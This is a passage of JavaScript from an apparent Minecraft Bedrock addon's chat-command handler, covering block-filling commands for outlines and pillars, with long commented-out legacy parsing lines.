                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        finally {
                            ta?.remove();
                        } }, 2);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ioutline$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    system.run(() => { try {
                        let startTime = Date.now();
                        let a = fillBlocksHO(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                        let endTime = Date.now();
                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^itoutline$/):
                {
                    eventData.cancel = true;
                    let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string"]);
                    let args = argsa.args;
                    let argsaextra = argsa.extra;
                    let coordinatesa = evaluateCoordinates(args[1], args[2], args[3], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(args[4], args[5], args[6], player.location, player.getRotation());
                    //let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1
                    //let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex)
                    let firstblockname = args[7];
                    let firstblockstates = argsa.extra.trimStart().startsWith("{") ? JSONParse(extractJSONStrings(argsa.extra.trimStart(), false)[0]) : argsa.extra.trimStart().startsWith("[") ? JSONParse(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().split(" ")[0];
                    let somethingtest = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates];
                    console.warn(JSONStringify({ coordinatesa, coordinatesb, firstblockname, argsaextra, args /*, firstblocknameindex, reststringaftercoordinates*/, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock }));
                    system.run(() => { let ta; try {
                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                        system.runTimeout(() => { try {
                            let startTime = Date.now();
                            let a = fillBlocksHO(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                            let endTime = Date.now();
                            player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        finally {
                            ta?.remove();
                        } }, 2);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ipillars$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    system.run(() => { try {
                        let startTime = Date.now();
                        let a = fillBlocksHP(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                        let endTime = Date.now();
                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^itpillars$/):
                {
                    eventData.cancel = true;
                    let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string"]);
                    let args = argsa.args;
                    let argsaextra = argsa.extra;
                    let coordinatesa = evaluateCoordinates(args[1], args[2], args[3], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(args[4], args[5], args[6], player.location, player.getRotation());
                    //let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1
                    //let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex)
                    let firstblockname = args[7];
                    let firstblockstates = argsa.extra.trimStart().startsWith("{") ? JSONParse(extractJSONStrings(argsa.extra.trimStart(), false)[0]) : argsa.extra.trimStart().startsWith("[") ? JSONParse(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().split(" ")[0];
                    let somethingtest = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates];
                    console.warn(JSONStringify({ coordinatesa, coordinatesb, firstblockname, argsaextra, args /*, firstblocknameindex, reststringaftercoordinates*/, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock }));
                    system.run(() => { let ta; try {
                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                        system.runTimeout(() => { try {
                            let startTime = Date.now();
